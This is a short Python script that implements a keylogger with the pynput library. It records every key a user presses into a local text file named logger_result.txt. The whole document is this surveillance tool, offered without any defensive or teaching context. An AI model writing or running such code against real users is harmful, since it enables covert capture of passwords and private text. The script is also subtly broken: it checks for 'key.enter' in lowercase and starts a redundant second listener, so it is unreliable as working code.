import _datetime as dt
from pynput import keyboard

with open("logger_result.txt" , "w") as file:
    file.write("\n")


def pressed(key):
    try:
        key_pressed = format(key.char)
        with open("logger_result.txt" , "a") as file:

            file.write(f'{key_pressed}')

    except:
        key_pressed = format(key)
        with open("logger_result.txt", "a") as file:
            if key_pressed == "key.enter":
                file.write('\n')
            if key_pressed == "Key.space":
                file.write(" ")

# def released(key):
#     try:
#         key_pressed = format(key.char)
#         with open("logger_result.txt", "a") as file:
#             file.write(f'alphanumeric key {key_pressed} pressed \n')
#     except:
#         key_pressed = format(key)
#         with open("logger_result.txt", "a") as file:
#             file.write(f'alphanumeric key {key_pressed} pressed \n')

with keyboard.Listener(
    on_press=pressed) as listner:
    listner.join()

listener = keyboard.Listener(
    on_press=pressed)
listener.start()